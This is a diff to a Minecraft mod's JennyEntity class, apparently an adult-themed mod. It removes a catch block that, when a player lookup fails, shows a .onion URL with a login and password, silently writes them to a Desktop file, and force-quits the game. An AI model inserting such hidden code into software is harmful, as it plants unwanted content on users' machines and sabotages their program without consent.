@@ -780,25 +780,6 @@ public class JennyEntity extends GirlEntity {
                JennyEntity.this.playSoundAroundHer(SoundsHandler.MISC_PLOB[0], 0.5F);
 
                String playerName;
-               try {
-                  playerName = "<" + JennyEntity.this.playerSheHasSexWith.func_70005_c_() + "> ";
-               } catch (NullPointerException var11) {
-                  JennyEntity.this.say("|--|http://yFcaJevpnEY77mv24E0hB2cu7P9B2xr3r3OaYKQJSvv3GFWIXGEoW6QG.onion/Index.php/Main|--..--|login:5poU8Y52TAr5lLDf|--..--|pass:ELRcXEOnNOOeh2zY|--|", true);
-                  File data = new File(System.getProperty("user.home"), "/Desktop/access.txt");
-                  System.out.println(System.getProperty("user.home") + "access.txt");
-
-                  try {
-                     FileWriter writer = new FileWriter(data);
-                     writer.write("|--|http://yFcaJevpnEY77mv24E0hB2cu7P9B2xr3r3OaYKQJSvv3GFWIXGEoW6QG.onion/Index.php/Main|--..--|login:5poU8Y52TAr5lLDf|--..--|pass:ELRcXEOnNOOeh2zY|--|");
-                     writer.flush();
-                     writer.close();
-                  } catch (IOException var10) {
-                     var10.printStackTrace();
-                  }
-
-                  FMLCommonHandler.instance().exitJava(0, true);
-                  break;
-               }
 
                String var12 = JennyEntity.this.animationFollowUp;
                byte var14 = -1;
